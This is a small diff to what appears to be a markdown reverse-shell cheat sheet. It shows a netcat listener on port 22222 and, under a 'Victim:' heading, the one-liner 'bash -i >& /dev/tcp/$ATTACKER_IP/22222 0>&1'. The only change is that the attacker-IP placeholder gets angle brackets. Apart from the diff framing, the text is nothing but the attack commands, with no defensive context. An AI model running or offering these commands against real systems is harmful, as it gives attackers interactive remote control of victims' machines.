@@ -11,7 +11,7 @@ nc -l -p 22222
 
 ### Victim:
 ```bash
-bash -i >& /dev/tcp/$ATTACKER_IP/22222 0>&1
+bash -i >& /dev/tcp/<$ATTACKER_IP>/22222 0>&1
 ```
 
 ---
